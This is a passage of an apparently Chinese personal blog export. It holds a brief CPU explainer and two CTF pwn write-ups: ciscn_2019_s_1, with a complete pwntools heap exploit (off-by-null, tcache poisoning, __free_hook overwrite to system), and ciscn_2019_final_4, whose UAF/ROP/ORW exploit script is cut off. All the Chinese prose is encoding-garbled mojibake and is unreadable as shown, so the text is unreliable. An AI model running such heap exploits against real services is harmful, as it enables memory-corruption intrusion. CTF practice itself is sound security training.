title="å¹³å¸¸è¯´çš„CPUåˆ°åº•æ˜¯ä¸ªå•¥"></a>å¹³å¸¸è¯´çš„CPUåˆ°åº•æ˜¯ä¸ªå•¥</h1><p><strong>CPUæ˜¯æŒ‡ä¸­å¤®å¤„ç†å™¨ï¼Œé€šä¿—æ¥è®²å°±æ˜¯è¯»å–æŒ‡ä»¤ç„¶åæ‰§è¡Œç„¶åå†è¯»å–ï¼Œç”¨ä¸åœæ­‡ç›´åˆ°æ–­ç”µ</strong>ã€‚å®ƒä½œä¸ºè®¡ç®—æœºç³»ç»Ÿçš„è¿ç®—å’Œæ§åˆ¶æ ¸å¿ƒï¼Œæ˜¯ä¿¡æ¯å¤„ç†ã€ç¨‹åºè¿è¡Œçš„æœ€ç»ˆæ‰§è¡Œå•å…ƒã€‚CPUé‡Œé¢åˆ†ä¸ºä¸‰ä¸ªå¾ˆé‡è¦çš„éƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯ALUï¼ˆç®—æœ¯é€»è¾‘å•å…ƒï¼‰ï¼Œå¯„å­˜å™¨ç»„ï¼Œæ§åˆ¶å•å…ƒã€‚</p><h2 id="ALU"><a href="#ALU" class="headerlink" title="ALU"></a>ALU</h2><p>æ˜¯CPUçš„æ ¸å¿ƒï¼Œå› ä¸ºå®ƒæ˜¯è´Ÿè´£è®¡ç®—çš„</p><h2 id="å¯„å­˜å™¨ç»„"><a href="#å¯„å­˜å™¨ç»„" class="headerlink" title="å¯„å­˜å™¨ç»„"></a>å¯„å­˜å™¨ç»„</h2><p>å®è´¨ä¸Šå°±æ˜¯CPUä¸­æš‚æ—¶å­˜æ”¾æ•°æ®çš„åœ°æ–¹ï¼Œé‡Œé¢ä¿å­˜ç€ç­‰å¾…å¤„ç†å’Œå¤„ç†è¿‡çš„æ•°æ®ã€‚</p><h2 id="æ§åˆ¶å•å…ƒ"><a href="#æ§åˆ¶å•å…ƒ" class="headerlink" title="æ§åˆ¶å•å…ƒ"></a>æ§åˆ¶å•å…ƒ</h2><p>ç®€å•æ¥è¯´ï¼Œæ§åˆ¶å•å…ƒå°±æ˜¯æ¥æŒ‡æŒ¥CPUå†…éƒ¨çš„å·¥ä½œçš„ã€‚</p><h1 id="å¹¶å‘å’Œå¹¶è¡Œ-amp-amp-è¶…çº¿ç¨‹"><a href="#å¹¶å‘å’Œå¹¶è¡Œ-amp-amp-è¶…çº¿ç¨‹" class="headerlink" title="å¹¶å‘å’Œå¹¶è¡Œ&amp;&amp;è¶…çº¿ç¨‹"></a>å¹¶å‘å’Œå¹¶è¡Œ&amp;&amp;è¶…çº¿ç¨‹</h1><p>ç®€å•æ¥è¯´ï¼Œå¹¶å‘å°±æ˜¯ä¸¤ä¸ªäº‹ä»¶æˆ–å¤šä¸ªäº‹ä»¶åœ¨ä¸€ä¸ªæ—¶é—´ä¾æ¬¡å‘ç”Ÿï¼›è€Œå¹¶è¡Œåˆ™æ˜¯ä¸¤ä¸ªæ—¶é—´æˆ–å¤šä¸ªäº‹ä»¶åœ¨ä¸€ä¸ªæ—¶é—´åŒæ—¶å‘ç”Ÿã€‚</p><h2 id="å¹¶å‘"><a href="#å¹¶å‘" class="headerlink" title="å¹¶å‘"></a>å¹¶å‘</h2><p>æˆ‘ä»¬çŸ¥é“å¦‚æœåªæœ‰ä¸€ä¸ªCPUçš„è¯ï¼Œé‚£ä¹ˆå®ƒåœ¨æŸä¸€æ—¶åˆ»ä¹Ÿåªèƒ½æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹ï¼Œå› æ­¤å®ƒè¦æ‰§è¡Œå¤šä¸ªçº¿ç¨‹ï¼Œå°±åªèƒ½æŠŠæ—¶é—´åˆ†æˆè‹¥å¹²æ®µï¼Œç„¶åæŠŠæ¯ä¸€æ®µæ—¶é—´åˆ†åˆ«åˆ†é…ç»™æ¯ä¸ªçº¿ç¨‹ã€‚åœ¨æŸä¸€æ—¶åˆ»çº¿ç¨‹ä»£ç åœ¨è¿è¡Œæ—¶ï¼Œå…¶ä»–çº¿ç¨‹æ˜¯å¤„äºæŒ‚èµ·çŠ¶æ€ã€‚</p><h2 id="å¹¶è¡Œ"><a href="#å¹¶è¡Œ" class="headerlink" title="å¹¶è¡Œ"></a>å¹¶è¡Œ</h2><p>å¯å¦‚æœæˆ‘ä»¬æ‹¥æœ‰äº†å¤šä¸ªCPUï¼Œé‚£æ¯ä¸€ä¸ªCPUéƒ½å¯ä»¥åœ¨ä¸€ä¸ªæ—¶åˆ»å»å¤„ç†ä¸€ä¸ªçº¿ç¨‹ï¼Œä»è€Œç³»ç»Ÿåœ¨æ“ä½œçš„æ—¶å€™ï¼Œå°±å¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ªçº¿ç¨‹ï¼ˆä¸”çº¿ç¨‹ä¹‹é—´äº’ä¸æŠ¢å CPUçš„èµ„æºï¼‰ï¼Œè¿™å°±æ˜¯å¹¶è¡Œã€‚</p><p>å¯æ˜¯å³ä½¿åªæœ‰ä¸€ä¸ªCPUï¼Œåœ¨ç”¨æˆ·çœ‹æ¥ï¼Œç³»ç»Ÿä¼¼ä¹è¿˜æ˜¯å¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ªçº¿ç¨‹ï¼Œé‚£æ˜¯å› ä¸ºCPUå¤„ç†çš„é€Ÿåº¦æ˜¯åœ¨å¤ªå¿«äº†ï¼Œä½¿å¤šä¸ªçº¿ç¨‹å¿«é€Ÿäº¤æ›¿è¿›è¡Œï¼Œä»è€Œç»™äººçš„æ„Ÿè§‰æ˜¯åœ¨åŒä¸€ä¸ªæ—¶é—´å¤„ç†äº†å¤šä¸ªçº¿ç¨‹ã€‚</p><h2 id="è¶…çº¿ç¨‹"><a href="#è¶…çº¿ç¨‹" class="headerlink" title="è¶…çº¿ç¨‹"></a>è¶…çº¿ç¨‹</h2><p>å¦‚æœç†è§£äº†å‰é¢çš„å¹¶è¡Œä¹‹åï¼Œè¶…çº¿ç¨‹ï¼ˆæœ‰æ—¶ä¹Ÿè¢«ç§°ä¸ºå¤šçº¿ç¨‹ï¼‰å°±ä¸éš¾ç†è§£äº†ï¼Œå®ƒå¯ä»¥è®©ä¸€ä¸ªCPUèƒ½å¤Ÿåˆ°è¾¾çº¿ç¨‹çº§å¹¶è¡Œè®¡ç®—ã€‚å¤§æ¦‚æ˜¯é€šè¿‡å¤‡ä»½ä¸€äº›CPUçš„ç¡¬ä»¶ï¼Œæ¯”å¦‚å¯„å­˜å™¨æ–‡ä»¶å’Œç¨‹åºè®¡æ•°å™¨ç­‰ç­‰ï¼Œå°½ç®¡æ­¤æ—¶çš„CPUå¯ä»¥åŒæ—¶å¤„ç†ä¸¤ä¸ªçº¿ç¨‹ï¼Œä½†é™¤å»åˆšæ‰æåˆ°çš„å¯„å­˜å™¨æ–‡ä»¶å’Œç¨‹åºè®¡æ•°å™¨ï¼Œå…¶ä»–ç¡¬ä»¶ä¾ç„¶æ˜¯è¢«å…±äº«çš„ã€‚</p><p>å‚è€ƒæ–‡ç«  <a href="https://www.zhihu.com/question/497245883">https://www.zhihu.com/question/497245883</a><br>å›¾ç‰‡é“¾æ¥ <a href="https://www.php.cn/faq/422175.html">https://www.php.cn/faq/422175.html</a></p>]]></content>
      
      
      <categories>
          
          <category> è¯»ä¹¦ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_s_1</title>
      <link href="/posts/f5fe6d2b.html"/>
      <url>/posts/f5fe6d2b.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220906222410458-1956148377.png"></p><h2 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h2><p><img src="/../img/2706180-20220906222419536-1535739468.png"></p><p>åœ¨editå‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ªoff by nullæ¼æ´ã€‚</p><h2 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h2><p><img src="/../img/2706180-20220906222442298-1594138131.png"></p><p>åœ¨addå‡½æ•°ä¸­ï¼Œå¯¹mallocç”³è¯·çš„å†…å­˜å¤§å°åšäº†é™åˆ¶ï¼Œéœ€è¦å°äº0x100å¹¶ä¸”å¤§äº0x7fçš„å †å—æ‰è¡Œï¼Œç„¶åç´¢å¼•æˆ‘ä»¬å¯ä»¥ä½¿ç”¨0åˆ°31(32æ²¡æ³•ç”¨ï¼Œå› ä¸ºè¿™é‡Œçš„len[32]å’Œheap[0]æ˜¯ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œå¦‚æœç”¨äº†32ï¼Œé‚£ä¹ˆlen[32]å°±æœ‰æ•°æ®äº†ï¼Œåˆ°äº†ç”³è¯·ç´¢å¼•ä¸º0å·å †å—çš„æ—¶å€™ï¼Œheap[0]æœ‰å†…å®¹ï¼Œå°±ä¼šè¿›å…¥ifç¨‹åºé€€å‡º)</p><p>editå‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ªoff by nullï¼Œå¹¶ä¸”æœ‰ä¸ªkey1çš„é™åˆ¶ï¼Œå¯¼è‡´äº†editå‡½æ•°åªèƒ½æ‰§è¡Œä¸¤æ¬¡ã€‚</p><p>showå‡½æ•°è¡¨é¢æ„Ÿè§‰èƒ½ä½¿ç”¨ï¼Œä½†æ˜¯key2åœ¨bssæ®µï¼Œé»˜è®¤å€¼ä¸º0ï¼Œæ‰€ä»¥showå‡½æ•°æˆ‘ä»¬æ— æ³•æ­£å¸¸ä½¿ç”¨(å¦‚ä¸‹å›¾)</p><p><img src="/../img/2706180-20220906222455658-560983424.png"></p><p>deleteå‡½æ•°å¯ä»¥æ— é™æ¬¡ä½¿ç”¨ï¼Œä½†æ˜¯ä¸å­˜åœ¨æ¼æ´ã€‚</p><h2 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h2><p>ç¨‹åºçš„libcç‰ˆæœ¬ä¸º2.29,æˆ‘ä»¬å¸¸è§„æ‰“ä¸€ä¸ªoff by nullåšä¸€ä¸ªå †å—é‡å ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬æ— æ³•ç›´æ¥é‡Šæ”¾æ‰å †å—è®©å…¶è¿›å…¥unsorted bin(è€Œoff by nullåšçš„å †å—åˆå¹¶éœ€è¦è®©å †å—ä½äºunsorted binä¸­)ï¼Œæ‰€ä»¥åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦tcachebinä¸­å¡«æ»¡å †å—(ä¸å¿…æ‹…å¿ƒç´¢å¼•çš„é—®é¢˜ï¼Œæˆ‘ä»¬æœ‰32ä¸ªç´¢å¼•å¯ä»¥ç”¨ï¼ŒåŒæ—¶deleteå‡½æ•°è¿˜å¯ä»¥æ¸…ç©ºç´¢å¼•ä¸­å†…å®¹)</p><p>ç„¶åæ‰“ä¸€ä¸ªoff by nullï¼Œæ­¤æ—¶çš„å †å—å¸ƒå±€åº”è¯¥å¦‚ä¸‹ï¼š</p><p>è¿™ä¸ªmerge chunkçš„prev sizeè¢«ä¿®æ”¹ä¸ºäº†0x200  (merged chunkä¹‹æ‰€ä»¥å¯ä»¥è¿›å…¥unsorted binä¸­æ˜¯å› ä¸ºåœ¨è¿™ä¹‹å‰tcahce binä¸­å·²ç»è£…äº†ä¸ƒä¸ªchunkäº†)</p><p><img src="/../img/2706180-20220906222534768-1045740973.png"></p><p>ç„¶åæˆ‘ä»¬é‡Šæ”¾æ‰merge chunkï¼Œè§¦å‘åˆå¹¶ï¼Œæ‰“ä¸€ä¸ªå †å—é‡å ï¼Œç„¶ååšä¸€ä¸ªdouble freeå‡ºæ¥ã€‚æ¥ç€æ‰“tcache poisoning,æˆ‘ä»¬å»å°†å †å—çš„fdæŒ‡é’ˆå»ä¿®æ”¹ä¸º0x6021d0è¿™ä¸ªåœ°å€ï¼Œå› ä¸ºè¿™ä¸ªåœ°å€æ—¢å±äºæˆ‘ä»¬çš„heapæŒ‡é’ˆæ•°ç»„ï¼ŒåŒæ—¶åŠ ä¸Š0xf0åè¿˜å¯ä»¥å»ä¿®æ”¹key1å’Œkey2ã€‚</p><p>(å…¶å®è¿™é“é¢˜çœ‹è§keyè¿™ä¸ªåå­—åŒæ—¶è”æƒ³ä¸‹key1å’Œkey2çš„ä½œç”¨ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°å»ç¯¡æ”¹è¿™ä¸¤ä¸ªå€¼ï¼Œä¸ç„¶editç”¨ä¸äº†ï¼Œæˆ‘ä»¬ä¹‹åçš„å„ç§æ‰‹æ³•éƒ½ä¼šå¤±æ•ˆï¼Œè€Œä¿®æ”¹key2è¿˜å¯ä»¥ä½¿ç”¨showå‡½æ•°)ï¼Œä½†å¦‚æœä»…ä»…æ˜¯ä¿®æ”¹keyå€¼çš„è¯ï¼Œå°±å¯¼è‡´äº†æˆ‘ä»¬ä¹‹åè¿˜è¦å†æ‰“ä¸€éoff by nullï¼Œä½†æ˜¯0xf0è¿™ä¸ªé“¾å·²ç»æˆ-1åæ‰äº†ï¼Œåº”è¯¥å°±æ²¡æ³•åˆ©ç”¨äº†(æˆ‘æ²¡æœ‰ä»”ç»†è€ƒè™‘è¿™ç§æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘è¯•äº†ä¸‹ï¼Œè¿™0xf0é“¾åæ‰ä¹‹åï¼Œoff by nullå°±æ²¡æ³•å†æ‰“ä¸€æ¬¡äº†ï¼Œå¦‚æœæœ€å¼€å§‹åšä¸‰ä¸ªç›¸åŒçš„å †å—åœ°å€ï¼Œä¿è¯0xf0çš„è¿™ä¸ªé“¾ä¸ä¼šåœ¨ç¬¬ä¸€æ¬¡æ‰“ä¸ªdouble freeå°±åæ‰ï¼Œåº”è¯¥ä¹Ÿå¯ä»¥åˆ©ç”¨(ä½†æ˜¯æˆ‘æ²¡æœ‰è¯•ï¼Œè¿™åªæ˜¯æˆ‘çš„ä¸€ä¸ªæ€è·¯))</p><p>ä½†æ˜¯æˆ‘å½“æ—¶çœ‹äº†ä¸‹bssæ®µå­˜å‚¨çš„æ•°æ®ï¼Œå‘ç°å¯ä»¥åŒæ—¶æ§åˆ¶key1ã€key2å’ŒheapæŒ‡é’ˆæ•°ç»„é‡Œçš„å†…å®¹ï¼Œå°±æ˜¯ç”³è¯·åˆ°0x6021d0è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€ä½äºheap[31]ï¼Œæˆ‘ä»¬å…ˆç”³è¯·å‡ºæ¥ä¿®æ”¹key1å’Œkey2çš„å€¼ï¼Œç„¶åæ‰§è¡Œshowå‡½æ•°æ‹¿åˆ°libcåœ°å€ï¼Œå†å»å¾€0x6021d0è¿™ä¸ªåœ°å€ä¸Šå†™å…¥free_hookçš„åœ°å€ï¼Œæœ€åç¼–è¾‘heap[31]è¿™ä¸ªå—ï¼Œå†™å…¥systemçš„åœ°å€å³å¯ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400DEE</span></span><br><span class="line">d_a=<span class="number">0x400DE2</span></span><br><span class="line">d_e=<span class="number">0x400DFA</span></span><br><span class="line">d_s=<span class="number">0x400E06</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27970&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">31</span>,<span class="number">0xf8</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i,<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0xf0</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#overflow chunk</span></span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0xf0</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">    add(<span class="number">10</span>,<span class="number">0xf0</span>,<span class="string">&#x27;e&#x27;</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(i)   </span><br><span class="line">    delete(<span class="number">7</span>) </span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">    delete(<span class="number">9</span>)<span class="comment">#off by nullï¼Œè§¦å‘å †å—åˆå¹¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i,<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#å°†tcache binç»™æ¸…ç©ºï¼Œç»™æ¥ä¸‹æ¥çš„tcache poisoningåšå‡†å¤‡</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">11</span>,<span class="number">0xf0</span>,<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">    add(<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">    edit(<span class="number">13</span>,p64(<span class="number">0x6021d0</span>))<span class="comment">#tcache poisoning</span></span><br><span class="line">    add(<span class="number">14</span>,<span class="number">0xf0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">15</span>,<span class="number">0xf0</span>,p64(<span class="number">0</span>)*<span class="number">29</span>+p32(<span class="number">1</span>)+p32(<span class="number">3</span>))<span class="comment">#ä¿®æ”¹ä¸¤ä¸ªkey</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xe0</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ebd90</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">15</span>,p64(<span class="number">0</span>)+p64(free_hook))</span><br><span class="line">    <span class="comment">#debug(p,d_a,d_d,d_e,d_s,0x400A25) </span></span><br><span class="line">    edit(<span class="number">31</span>,p64(sys_addr))</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220906222614225-57262606.png"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> off_by_null </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_final_4</title>
      <link href="/posts/d2d67d3f.html"/>
      <url>/posts/d2d67d3f.html</url>
      
        <content type="html"><![CDATA[<h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442042.png" alt="image-20221112144214948"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442447.png" alt="image-20221112144230347"></p><h3 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442191.png" alt="image-20221112144247139"></p><p>deleteå‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ªUAFæ¼æ´(å¦‚ä¸Š)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442868.png" alt="image-20221112144257829"></p><p>åœ¨addå‡½æ•°ä¸­çš„sizeæœ€å¤§ä¸º0x1000,å› æ­¤å¯ä»¥ç”³è¯·è¿›å…¥unsorted binä¸­çš„å †å—ï¼ŒåŒæ—¶ç¨‹åºä¸­å­˜åœ¨showå‡½æ•°ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>çœ‹å…¶ä»–å¸ˆå‚…çš„wpï¼Œå‘ç°åŸºæœ¬éƒ½æ˜¯å»æ‹¿åˆ°libcåœ°å€åæ³„éœ²äº†ä¸€ä¸ªæ ˆåœ°å€(åˆ©ç”¨environæ¥æ³„éœ²)ã€‚ä½†å…¶å®è¿™é“é¢˜æ²¡æœ‰è¿™ä¹ˆéº»çƒ¦ï¼Œå¹¶ä¸éœ€è¦æ³„éœ²æ ˆåœ°å€çš„ï¼Œè¿™é‡Œè®°å½•ä¸‹åˆ©ç”¨æ€è·¯ã€‚</p><p>é¦–å…ˆè®©å †å—è¿›å…¥unsorted binï¼Œç„¶åæ‰§è¡Œshowå‡½æ•°æ¥æ³„éœ²libcåœ°å€ã€‚</p><p>ç”±äºæœ¬é¢˜å¼€äº†æ²™ç®±ï¼Œæˆ‘ä»¬è€ƒè™‘ç”¨orwçš„æ–¹å¼ï¼Œä½†æ˜¯å› ä¸ºlibcä¸º2.23çš„ï¼Œæ— æ³•ç”³è¯·å‡ºæ¥free_hookå¯¼è‡´äº†æ²¡æ³•ç”¨setcontextæ¥è®¾ç½®å¯„å­˜å™¨æ‰“orwã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å‘ç°ç¨‹åºå¾€æ ˆé‡Œè¾“å…¥äº†å¤§é‡çš„æ•°æ®(å¦‚ä¸‹),å°±ç»™äº†æˆ‘ä»¬ropçš„æœºä¼š(å°½ç®¡æˆ‘ä»¬æ— æ³•æº¢å‡ºæ§åˆ¶è¿”å›åœ°å€)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121443695.png" alt="image-20221112144309646"></p><p>åœ¨åŠ«æŒmalloc_hookä¹‹å‰æˆ‘ä»¬æ‹¿åˆ°äº†libcåœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å¦‚æœå»åŠ«æŒmalloc_hookä¸ºadd rsp,0x38;ret(0x38æ˜¯è°ƒè¯•å‡ºæ¥çš„)ï¼Œå½“ä¸‹ä¸€æ¬¡æ‰§è¡Œmallocçš„æ—¶å€™å°±ä¼šè®©æ ˆé¡¶å¢åŠ 0x38ï¼Œç„¶åæ‰§è¡Œretçš„æ—¶å€™å°±å¯ä»¥åŠ«æŒåˆ°æˆ‘ä»¬æœ€åˆè¾“å…¥çš„ropé“¾ä¸Š(å¦‚ä¸‹)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121443683.png" alt="image-20221112144337170"></p><p>æ­¤æ—¶æˆ‘ä»¬æœ‰äº†libcåœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬è€ƒè™‘ç”¨ç¨‹åºåŸæœ¬çš„gadgetå»æ‰§è¡Œä¸€ä¸‹readå‡½æ•°ï¼Œå°†ropé“¾è¯»åˆ°bssæ®µä¸Šï¼Œæœ€åç”¨pop rspè¿™ä¸ªgadgetè®©æ ˆè¿ç§»åˆ°bssæ®µè¿›è¡Œç¬¬äºŒæ¬¡ropï¼Œè€Œè¿™æ¬¡çš„ropé“¾ä¸­æˆ‘ä»¬å°±å¯ä»¥å†™å…¥libcä¸­çš„åœ°å€äº†ï¼Œæˆ‘é‡‡ç”¨çš„æ˜¯æ‰§è¡Œäº†mprotectå‡½æ•°è®©bssæ®µå˜æˆå¯è¯»å¯å†™å¯æ‰§è¡Œçš„ï¼Œåé¢ç´§è·Ÿç€orwçš„shellcodeå³å¯ã€‚</p><p>æ€»ç»“ä¸€ä¸‹è¿™é“é¢˜éœ€è¦æ³¨æ„å‡ ç‚¹:</p><ol><li>å†™orwçš„shellcodeæ—¶ï¼Œè¦ç”¨closeå‡½æ•°å…ˆå…³é—­æ–‡ä»¶æè¿°ç¬¦0ï¼Œå†ç”¨openatç³»ç»Ÿè°ƒç”¨(å› ä¸ºæœ¬é¢˜æŠŠopenä¹Ÿç»™ç¦äº†ï¼Œè¿™ä¸ªæ˜¯åœ¨ç¨‹åºé‡Œå®ç°çš„)å»è¯»å‡ºflagæ–‡ä»¶ã€‚</li><li>æœ¬ç¨‹åºä¸­ï¼Œè‡ªå·±è®¾ç½®äº†ä¸€ä¸ªåè°ƒè¯•çš„åŠŸèƒ½ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±ç”¨idaæŠŠç›¸å…³æŒ‡ä»¤ç»™nopæ‰ï¼Œæ‰èƒ½è¿›è¡Œè°ƒè¯•ã€‚</li><li>æœ€åæ ˆè¿ç§»åˆ°bssæ®µä½¿ç”¨çš„æ˜¯ç¨‹åºä¸­åŸæœ¬çš„ä¸€ä¸ªgadget: pop rsp</li></ol><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25919&quot;</span>,<span class="string">&quot;buu64-libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span 